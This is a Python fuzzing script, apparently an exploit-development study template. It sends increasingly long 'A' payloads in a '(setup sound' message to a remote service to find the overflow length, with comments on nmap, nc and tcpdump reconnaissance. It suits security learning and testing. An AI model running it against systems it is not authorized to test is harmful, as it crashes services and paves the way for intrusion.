#!/usr/bin/env python3
import socket, time, sys

# NOTE: This template used https://www.exploit-db.com/exploits/1582 as the example
# IMPORTANT: Dont forget to set up l_bytes

# Phase 1: Fuzzing to find injection length
#	Fuzzing is not an exact science, but one approach is to
#	fuzz with blocks that increase by large amounts, then
#	circle back with ever smaller increases as the exact
#	buffer size is determined

# ------------------------------------------------------------------
# How do I know what l_bytes to send?
# ------------------------------------------------------------------
# IP and port, nmap -p- <host> discovered port on <port>
# nc confirms port, nc <host> <port>
# tcpdump and wireshark can show packet structure
# tcpdump -i eth1 -nn -w /tmp/packets host <host> &
# wireshark /tmp/packets

if len(sys.argv) != 6:
    print()
    print("Usage: {} <target ip> <target port> <initial payload size> <number of payloads> <payload increment>".format(sys.argv[0]))
    print("\ttarget ip: Remote hostname or IP address of target service")
    print("\ttarget port: Remote port of target sevice")
    print("\tinitial payload size: Number of characters to send in first payload")
    print("\tnumber of payloads: Number of payloads to send")
    print("\tpayload increment: Number of bytes to add to the payload each round")
    exit(0)

# sys.argv is the list of command line arguments
RHOST = 1
RPORT = 2
INITIAL_PAYLOAD_SIZE = 3
NUMBER_PAYLOADS = 4
INCREMENT = 5

l_rhost: str = sys.argv[RHOST]
l_rport: int = int(sys.argv[RPORT])
l_initial_payload_size: int = int(sys.argv[INITIAL_PAYLOAD_SIZE])
l_number_of_payloads: int = int(sys.argv[NUMBER_PAYLOADS])
l_payload_increment: int = int(sys.argv[INCREMENT])

PAYLOAD_CHARACTER: str = "A"
l_payloads: list = []
l_initial_payload = PAYLOAD_CHARACTER * l_initial_payload_size

for i in range(0, l_number_of_payloads):
    l_payloads.append(l_initial_payload + PAYLOAD_CHARACTER * l_payload_increment * i)

for l_payload in l_payloads:
    try:
        # Create a TCP (socket)
        print("Connecting to {} port {}".format(l_rhost, l_rport))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((l_rhost, l_rport))
        print("Connected")
    except:
        print("Could not connect to {} port {}".format(l_rhost, l_rport))
        exit(0)

    try:
        # Send the message via the socket using the specific protocol
        print("Sending payload of length {}".format(len(l_payload)))
        l_bytes = b'\x11' + '(setup sound '.encode() + l_payload.encode() + b'\x90\x00' + '#'.encode()
        s.send(l_bytes)
        data = s.recv(1024)
        print("Data received: {}".format(data))
    except:
        print("Could not send payload")

    time.sleep(1)
    s.close()
